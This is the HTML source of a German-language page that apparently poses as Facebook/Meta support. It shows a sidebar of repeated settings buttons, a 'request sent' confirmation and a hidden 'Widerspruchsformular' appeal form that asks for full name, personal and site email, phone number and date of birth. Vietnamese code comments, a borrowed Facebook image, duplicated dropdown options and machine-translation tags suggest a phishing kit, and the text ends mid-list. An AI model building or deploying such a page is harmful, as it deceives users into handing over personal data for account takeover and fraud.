                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Facebook Settings</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Instagram Settings</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Facebook Settings</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Instagram Settings</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Facebook Settings</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Instagram Settings</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div></div>
                    </div>
                </div>
            </div>
            <div class="col-8">
                <div id="right">
                    <!-- <div id="utm-ticketId" style="display: block;">
                        <p class="small-grey">
                            Your ticket id: <span>4964-ATFD-48XD</span></p>
                    </div> -->
              <div class="action-button warning">
                            <div class="action-button-img">
                            </div>
                            <div class="action-button-arrow">
                                <!--?xml version="1.0" encoding="iso-8859-1"?-->
    <!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
        <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/YcU-p5D0S0h.png&quot;); background-position: 0px -6609px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
                                </div><div class="action-button-text">
                                <span style="font-weight: 600;" class="small-black"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ihre Anfrage wurde erfolgreich gesendet.
</font></font></font></font></font></font></span>
                            </div>
                        </div>
            <div id="card"><div class="action-button-list">
    <div class="action-button warning">
        <div class="action-button-icon">
            <!-- SVG -->
        </div>
        <div class="xyamay9 x1pi30zi x1l90r2v x1swvt13 x1n2onr6"><div><div class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1anpbxc xyorhqc xzboxd6 x14l7nz5"><div class="x9f619 x1n2onr6 x1ja2u2z"><div class="html-div xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x78zum5 x1n2onr6 xh8yej3"><div style="border-radius: max(0px, min(var(--card-corner-radius), calc((100vw - 4px - 100%) * 9999))) / var(--card-corner-radius);" class="x1n2onr6 x1ja2u2z xjbqb8w x1qpq9i9 xdney7k xu5ydu1 xt3gfkd x9f619 xh8yej3 x6ikm8r x10wlt62"><img draggable="false" height="100%" width="100%" alt="" class="xl1xv1r" referrerpolicy="origin-when-cross-origin" src="/images/ok.png"></div></div></div></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1anpbxc xyorhqc xzboxd6 x14l7nz5"><div class="x9f619 x1n2onr6 x1ja2u2z"><div class="x9f619 x1n2onr6 x1ja2u2z x6s0dn4 xwib8y2"><div class="x78zum5 xdt5ytf x11tup63 x16z1lm9"></div></div>
<br>
</div></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1anpbxc xyorhqc xzboxd6 x14l7nz5"><div class="x9f619 x1n2onr6 x1ja2u2z"><div class="x78zum5 xdt5ytf x4cne27 xifccgj"><div class="xzueoph x1k70j0n"><span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1jchvi3 x1lbecb7 xo1l8bm xzsf02u x1yc453h" dir="auto"><div class="x11i5rnm xat24cr x1mh8g0r x1vvkbs xtlvy1s">
    <p style="font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 10px;">
    Ihr Formular wurde erfolgreich gesendet! Bitte haben Sie einen Moment Geduld, während wir Ihre Anfrage bearbeiten. Normalerweise erhalten Sie innerhalb von wenigen Stunden bis einigen Tagen eine Rückmeldung, je nach Art Ihrer Anfrage.
  </p>
  <a href="https://www.facebook.com" style="color: #1877F2; text-decoration: none; font-weight: bold;">
     Zurück zu Facebook
  </a>
</div>
</span></div></div></div></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1anpbxc xyorhqc xzboxd6 x14l7nz5"><div class="x9f619 x1n2onr6 x1ja2u2z"><div class="x1n0m28w xp7jhwk"><div class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"><div aria-pressed="true" class="x1i10hfl x1qjc9v5 xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lliihq x1lq5wgf xgqcy7u x30kzoy x9jhf4c x443n21" role="button" tabindex="0"></div></div></div></div></div></div></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1anpbxc xyorhqc xzboxd6 x14l7nz5"><div class="x9f619 x1n2onr6 x1ja2u2z"><div class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"></div></div></div></div></div></div></div>
        <div class="action-button-arrow"></div>
    </div>
    <div class="action-button warning">
        <div class="action-button-icon">
            <!-- SVG -->
        </div>
        <div class="action-button-arrow"></div>
    </div>
  </div>
  <div class="card-text"></div></div>
  </div>
                    <br>
                    <p class="small-grey">
                        <a target="_blank" id="policyLink" class="add-svg" style="display: none;">
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>
                    </p>
                </div>
            </div>
            <div class="popup" id="popup">
                <div class="popup-item">
                    <div class="burger-button-popup" id="closePopup">
                        <div class="bar"></div>
                        <div class="bar"></div>
                    </div>
                    <div class="popup-content"></div>
                </div>
            </div>
        </div>
    <div class="modal form-modal" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
  <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Widerspruchsformular</font></font></font></font></font></font></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Schließen" fdprocessedid="130kka"></button>
                </div>
                <div class="modal-body">
                    <div id="first-form">
                                <div class="mb-3">
                            <input name="full-name" type="text" class="form-control" id="FullNameField" placeholder="Vollständiger Name" required="" fdprocessedid="vx4b0e">
                        </div><div class="mb-3">
    <input name="business-email" type="email" class="form-control" id="EmailField" placeholder="Persönliche E-Mail" required="" fdprocessedid="6hw0mq"><br>
    <div class="mb-3">
        <input name="full-name" type="text" class="form-control" id="bmmailField" placeholder="E-Mail der Site" required="" fdprocessedid="vx4b0e">
    </div>
    <!-- Thêm input cho số điện thoại -->
    <div class="mb-3">
        <input name="phone-number" type="tel" class="form-control" id="PhoneField" placeholder="Telefonnummer" required="">
    </div>
    <!-- Thêm input cho ngày tháng năm sinh -->
    <div class="mb-3">
        <label for="DateOfBirth" class="form-label">Geburtsdatum</label>
        <div id="DateOfBirth" class="d-flex gap-2">
            <!-- Dropdown für den Tag -->
            <select id="dob-day" name="dob-day" class="form-control" required="">
                <option value="" selected="" disabled="">Tag</option>
            <option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
            <!-- Dropdown für den Monat -->
            <select id="dob-month" name="dob-month" class="form-control" required="">
                <option value="" selected="" disabled="">Monat</option>
            <option value="1">Januar</option><option value="2">Februar</option><option value="3">März</option><option value="4">April</option><option value="5">Mai</option><option value="6">Juni</option><option value="7">Juli</option><option value="8">August</option><option value="9">September</option><option value="10">Oktober</option><option value="11">November</option><option value="12">Dezember</option><option value="1">Januar</option><option value="2">Februar</option><option value="3">März</option><option value="4">April</option><option value="5">Mai</option><option value="6">Juni</option><option value="7">Juli</option><option value="8">August</option><option value="9">September</option><option value="10">Oktober</option><option value="11">November</option><option value="12">Dezember</option></select>
            <!-- Dropdown für das Jahr -->
            <select id="dob-year" name="dob-year" class="form-control" required="">
                <option value="" selected="" disabled="">Jahr</option>
            <option value="2024">2024</option><option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option 